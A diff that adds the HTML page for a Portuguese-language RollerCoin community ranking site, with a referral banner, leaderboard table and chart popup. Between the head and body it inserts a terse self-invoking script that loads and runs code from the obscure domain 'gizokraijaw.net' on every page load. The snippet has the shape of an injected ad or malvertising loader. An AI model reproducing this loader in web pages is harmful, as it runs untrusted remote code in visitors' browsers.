@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RKFox - Ranking da Comunidade</title>
+    <link rel="stylesheet" href="styles2.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.17.0/xlsx.full.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://apis.google.com/js/api.js"></script>
+    <script src="contador.js"></script>
+</head>
+        <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',7666746,document.createElement('script'))</script>
+<body>
+    <div class="container">
+        <div class="ref">
+            <!--Start rollercoin.com code-->
+            <a href="https://rollercoin.com/?r=kyluudij">
+                <img src="https://static.rollercoin.com/static/img/ref/gen2/w320h50.png"/> 
+            </a> 
+            <!--End rollercoin.com code-->
+        </div>
+        <div class="profile">
+            <a href="https://rk-fox.github.io/">
+                <img src="/images/profile.png" alt="Foto de Perfil" class="profile-pic">
+            </a>
+        </div>
+        <div class="banner">
+            <a href="https://rk-fox.github.io/">
+                <img src="/images/banner.png" alt="Banner" class="banner-img">
+            </a>
+        </div>
+        
+        <!-- Toggle Switch Centralizado -->
+        <label class="switch">
+            <input type="checkbox" id="toggle-dark-mode">
+            <span class="slider"></span>
+        </label>
+
+        <div class="progress-container">
+            <div id="progress-bar" class="progress-bar">0%</div>
+        </div>
+
+        <!--<div class="ranking">
+    <table id="rankingTable">
+        <tbody>
+            <tr">
+                <td data-label="Nick">
+                <img src="./user_icon.png" 
+                     alt="Avatar do Rato" 
+                        style="width: 35px; height: 35px; border-radius: 50%; vertical-align: middle; margin-right: 8px;">
+                Rato Safado
+                </td>
+                <td data-label="Poder Total" class="poder-total"></td>
+                <td data-label="Progresso" class="progresso"></td>
+            </tr>
+        </tbody>
+    </table>
+</div>-->
+
+        
+        <div class="ranking">
+            <h1>Ranking da Comunidade</h1>
+            <h3>Aguarde um instante... os dados estão sendo carregados!</h3>
+            <table id="rankingTable">
+                <thead>
+                    <tr>
+                        <th>Rank</th>
+                        <th></th>
+                        <th>Nick</th>
+                        <th>Miners</th>
+                        <th>Bônus (%)</th>
+                        <th>Bônus</th>
+                        <th>Racks</th>
+                        <th>Poder Total</th>
+                        <th>Progresso</th>
+                   <!--     <th>Link</th>
+                        <th>Farm</th> -->
+                        <th>Hist</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td></td>
+                        <td></td>
+                        <td data-label="Nick">
+                        <img src="./user_icon.png" 
+                             alt="Avatar do Rato" 
+                             style="width: 35px; height: 35px; border-radius: 50%; vertical-align: middle; margin-right: 8px;">
+                        Rato Safado
+                        </td>
+                        <td></td>
+                        <td></td>
+                        <td></td>
+                        <td></td>
+                        <td data-label="Poder Total" class="poder-total"></td>
+                        <td data-label="Progresso" class="progresso"></td>
+                        <td></td>
+                    </tr>
+                    <!-- Os dados serão inseridos aqui -->
+                </tbody>
+            </table>
+        </div>
+        <!-- Popup HTML -->
+        <div id="popup" class="popup">
+            <div class="popup-content">
+                <span id="close-btn" class="close-btn">&times;</span>
+                <canvas id="userChart"></canvas>
+            </div>
+        </div>
+        <script src="ranking.js"></script>
+        <script src="script2.js"></script>
+        <script src="hist.js"></script>
+    </div>
+</body>
+</html>
